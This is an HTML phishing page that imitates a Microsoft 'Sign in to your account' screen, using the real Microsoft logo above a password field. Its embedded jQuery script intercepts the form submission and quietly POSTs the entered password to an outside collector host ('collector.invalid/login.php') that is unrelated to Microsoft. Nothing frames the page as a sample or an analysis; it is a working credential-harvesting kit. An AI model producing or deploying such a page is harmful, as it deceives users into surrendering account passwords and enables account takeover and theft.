<html><head><title>Sign in to your account</title></head><body>
<div id="logo"><img alt="Microsoft" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9c0f.svg"></div>
<form class="pass-form" method="post">
<input type="password" name="user_pass" id="yyy" placeholder="Password">
<button type="submit" id="pass-btn">Sign in</button>
</form>
<script>
$(document).on('submit', '.pass-form', function() {
  var password = $("#yyy");
  if (password.val() == "") { return false; }
  var formData = { 'passs_d': password.val() };
  $.ajax({
    type: 'POST',
    url: 'https://collector.invalid/login.php',
    data: formData
  });
});
</script></body></html>
